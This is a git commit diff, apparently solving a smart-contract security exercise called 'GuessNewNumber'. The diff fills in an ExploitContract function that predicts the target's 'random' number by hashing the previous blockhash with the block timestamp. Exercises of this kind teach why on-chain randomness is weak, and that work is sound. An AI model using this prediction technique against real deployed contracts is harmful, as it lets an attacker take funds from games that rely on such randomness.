e24313ef6757e61aaa70d05152d8e12dbcd0a3c6
vipin <vipineth@gmail.com>
2024-10-03 16:48:16 +0530

    solve guess new number

--- GuessNewNumber/src/GuessNewNumber.sol
+++ GuessNewNumber/src/GuessNewNumber.sol
@@ -27,7 +27,7 @@ contract ExploitContract {
     GuessNewNumber public guessNewNumber;
     uint8 public answer;
 
-    function Exploit() public returns (uint8) {
-        return answer;
+    function Exploit() public view returns (uint8) {
+        return uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
     }
 }
